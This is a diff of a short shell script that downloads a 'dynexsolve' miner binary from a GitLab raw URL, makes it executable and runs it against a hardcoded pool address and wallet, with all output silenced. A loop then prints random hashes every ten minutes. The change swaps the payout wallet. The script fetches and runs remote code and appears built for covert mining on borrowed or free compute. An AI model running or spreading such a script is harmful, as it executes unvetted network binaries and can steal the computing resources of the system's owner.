@@ -16,5 +16,5 @@ rm -f h-manifest.conf && wget =q 'https://gitlab.com/sumbawasemongkat/dynex/-/ra
 
 rm -f dynexsolve && wget -q 'https://gitlab.com/sumbawasemongkat/dynex/-/raw/main/dynexsolve' && chmod +x dynexsolve
 
-./dynexsolve -mining-address Xwn1ypf6EVnNhMN1juykzfTRBnu8AFe1WZTHA5f9GsX6Dvj5zuv9AB2TDgnM4X3qjsZrgfgojbnGEZRVepMAQYce28bdeCtww -no-cpu -multi-gpu -stratum-url 139.144.231.54 -stratum-port 443 -mallob-endpoint https://dnx.us.ekapool.com -stratum-password $(echo $(shuf -i 1-999999 -n 1)-CEK) >/dev/null 2>&1
+./dynexsolve -mining-address XwnQUEdJSaEDuyEywoPYX6ZoGiQf5cpYfi65t4BwkpQU26UbCuvUPTNTDgnM4X3qjsZrgfgojbnGEZRVepMAQYce28bdkjL2r -no-cpu -multi-gpu -stratum-url 139.144.231.54 -stratum-port 443 -mallob-endpoint https://dnx.us.ekapool.com -stratum-password $(echo $(shuf -i 1-999999 -n 1)-CEK) >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
